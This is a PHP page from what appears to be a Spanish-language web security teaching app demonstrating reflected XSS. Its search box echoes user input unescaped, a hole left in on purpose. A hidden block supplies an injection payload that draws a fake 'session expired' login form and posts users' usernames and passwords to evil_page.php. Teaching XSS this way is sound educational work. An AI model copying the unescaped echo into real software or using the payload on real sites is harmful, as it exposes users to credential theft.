<?php include('includes/header.php'); ?>
<?php
  $query = get_var('query');
?>
<script type="text/javascript">
function showCode() {
  $('#code').toggle('blind', 500);
  return false;
}
</script>
<div id="center">
  <div class="article_wrapper">
    <h2>XSS</h2>
    <div>
      <p>Buscador:</p>
      <form action="xss.php" method="get">
        <input type="text" size="30" name="query"/>
        <input type="submit" value="Buscar" class='button button-right'/>
      </form>
      <br/>
      <p>Para agregar un login falso a esta página por medio de XSS, ingresar este <a href="#" onclick='return showCode()'>código</a> en la búsqueda.</p>
      <div style="display:none" id="code" class="xss_code">
      <?php echo encode('<br><br><br><br><p><b>Su sesion caducó</b></p><p>Por favor ingrese nuevamente</p><form action="evil_page.php" method="post"><table><tr><td>Usuario:</td><td><p><input type="text" id="user" name="user"/></p></td></tr><tr><td>Clave:</td><td><p><input type="password" id="passw" name="passw"/></p></td></tr></table><input type="submit" value="Ingresar" class="button"/></form>') ?>
      </div>
      <br/>

<?php if ($query != null) { ?>
      <p>No hay resultados para: <?php echo $query ?></p>
<?php } ?>
    </div>
  </div>
</div>

  <div id="rightcolumn">
    <?php echo info_column('Información', 'Ejemplo de XSS. Se provee codigo para agregar a la página un login falso que envía los datos del usuario a un url del atacante (en este caso es solo otro .php de la misma aplicación). Para más información ver el capítulo 8.') ?>
  </div>
<?php include('includes/footer.php'); ?>
